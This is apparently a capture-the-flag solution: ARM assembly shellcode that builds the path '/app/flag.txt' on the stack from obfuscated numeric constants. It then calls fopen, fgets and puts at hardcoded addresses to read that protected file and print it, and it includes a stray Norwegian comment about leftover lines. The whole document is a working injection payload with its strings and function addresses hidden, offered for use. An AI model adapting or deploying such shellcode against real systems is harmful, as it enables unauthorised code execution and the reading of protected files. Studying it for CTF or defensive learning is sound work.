.text
.global _start

_start:
	push   	{r11, lr}   
	add    	r6, fp, #0 // pointer to main address 
	add    	r11, sp, #0 
	sub		sp, sp, #256 // end of prologue
	push	{r1}
	mov 	r5, #116
	push	{r5}	// 't'
	mov		r7, #11879
	movw 	r8, #7709
	add		r5, r7, r8, LSL #18
	push 	{r5}	// "g.tx"
	mov		r7, #26159
	movw 	r8, #6235
	add		r5, r7, r8, LSL #18
	push 	{r5} 	// "/fla"
	mov		r7, #24879
	movw 	r8, #1799
	add		r5, r7, r8, LSL #20
	push	{r5}	// "/app"
	mov		r5, #114
	push	{r5}	// 'r'
	add		r1, sp, #0 // pointer to "r"
	add		r0, sp, #4 // pointer to /app/flag.txt
	@ mov		r7, #27750 // tror jeg bare glemte å slette disse tre linjene en eller annen gang
	@ movw 	r8, #52930
	@ add		r5, r7, r8, LSL #15
	mov		r7, #76
	movw	r8, #2215
	add		r4, r7, r8, LSL #9 
	blx		r4 // call fopen
	push	{r0}
	mov		r1, #64 // flag size
	sub 	r0, r11, #128 //char buffer
	mov		r7, #4
	movw	r8, #17707
	add		r3, r7, r8, LSL #6 
	pop		{r2}
	blx		r3 // call fgets	
	sub 	r0, r11, #128 //char buffer
	mov		r7, #32
	movw	r8, #17733
	add		r3, r7, r8, LSL #6
	blx		r3 // call puts 
	sub    	sp, r11, #0  // start of epilogue
	pop    	{r11, pc}